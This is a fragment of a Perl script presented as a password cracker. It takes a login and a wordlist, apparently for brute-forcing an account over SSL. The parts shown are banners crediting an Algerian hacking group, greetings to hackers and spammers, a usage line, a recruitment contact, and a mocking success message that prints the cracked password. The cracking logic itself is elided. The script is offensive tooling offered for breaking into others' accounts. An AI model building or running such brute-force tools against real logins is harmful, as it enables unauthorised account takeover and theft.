...
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]
#
#[~] Programmed by a Big programmer from algeria ==> "Toxic Proo" OR "Zero Robot  :)
#[~] By Team */  Z0mb!e Gh0st Dz /*
#[~] We are : Salim-dz [~] Boumediene tahi[~]Chihab Os[~] zaki Mer[~] Zaka ria Dz[~] &&&&& ==>
#    ==>   [~]                                                Black Devil                                                [~] ^_^ *-*
#
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+==+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]
#[~] =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=[~]

#Geatz To: All Hackers & SPAMERS Tunisien 
...
print "   888    888 o888   888o 8888o   888   888    888       888    88   888    888 \n";
print "   888oooo88  888     888 88 888o8 88   888oooo88        888ooo8     888oooo88  \n";
print "   888    888 888o   o888 88  888  88   888    888       888         888    888 \n";
print "  o888ooo888    88ooo88  o88o  8  o88o o888ooo888       o888o       o888ooo888  \n\n";
...
print "\033[1;31m                   «======================================================================»\n";
print "                   «|~ Toxic Proo Dz : if u want join in my team ask me - fb/luise.proo ~|» \n";
print "\033[1;31m                   «======================================================================»\n";
print "\033[1;37m                             «|     ==>> Usage: perl $0 Login wordlist.txt     |»\n";
print "\033[1;37m                             «=====================================================»\n\n\n";
...
{
print "\n\n\n\n               =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=»\n";
print "               «[~] Yuuup !! Password Cracked enjoy => Pass is :       »\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n";
print "               «           $password                »\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n";
print "               ««««««««««««« Enjooooy Biiiitch hhhhhhhhhhhhh »»»»»»»»»»»\n";
print "               «ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ»\n\n";
close SSL;
exit;
}
